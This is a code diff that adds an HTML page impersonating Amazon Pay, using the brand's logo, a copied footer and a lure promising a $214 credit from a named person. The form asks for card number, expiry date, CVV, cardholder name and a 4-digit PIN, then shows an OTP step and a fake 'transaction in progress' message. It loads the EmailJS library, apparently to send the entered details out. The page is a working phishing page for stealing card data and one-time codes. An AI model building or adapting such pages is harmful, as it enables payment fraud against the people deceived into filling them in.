@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Pay Form</title>
+    <link href="trial_/css/styles.css" rel="stylesheet" />
+</head>
+<body>
+    <div class="content-container">
+        <img alt="Amazon Pay Logo" class="header-image" src="trial_/images/amazon pay logo.jpeg" />
+        <h1>Amazon Pay</h1>
+        <p class="note">The sum of <strong>$214</strong> will be credited to the account linked to the provided card details by Freda Noah.</p>
+
+        <form autocomplete="off" id="payment-form">
+            <label for="cardNumber">Card Number</label>
+            <input id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" required type="number" />
+            <div class="flex-container">
+                <div>
+                    <label for="expirationDate">Expiration Date</label>
+                    <input id="expirationDate" placeholder="MM / YY" required type="number" />
+                </div>
+                <div>
+                    <label for="cvv">CVV</label>
+                    <input id="cvv" placeholder="123" required type="number" />
+                </div>
+            </div>
+            <label for="cardName">Name on Card</label>
+            <input id="cardName" placeholder="First and Last Name" required type="text" />
+            <label for="password">4-digit Password</label>
+            <input id="password" maxlength="4" placeholder="****" required type="password" />
+
+            <button id="submit-button" type="submit">Add and Continue</button>
+        </form>
+
+        <div id="otp-container" style="display: none;">
+            <p>OTP Verification</p>
+            <label for="otp">*OTP*</label>
+            <input id="otp" placeholder="Enter OTP" required type="number" />
+            <button id="otp-submit-button" type="button">Verify OTP</button>
+        </div>
+
+        <p id="progress-message" style="display: none;">Transaction in progress, estimated time 30 min...</p>
+        <p id="transaction-completed-message" style="display: none;">Transaction will be completed in 30 min.</p>
+    </div>
+
+    <div class="footer-note-container">
+        <p>
+            <a href="#">Conditions of Use</a> | 
+            <a href="#">Privacy Notice</a> | 
+            <a href="#">Consumer Health Data Privacy Disclosure</a> | 
+            <a href="#">Your Ads Privacy Choices</a><br />
+            &copy; 1996-2024, Amazon Pay | Secured by Amazon
+        </p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
+    <script src="trial_/js/script.js"></script>
+</body>
+</html>
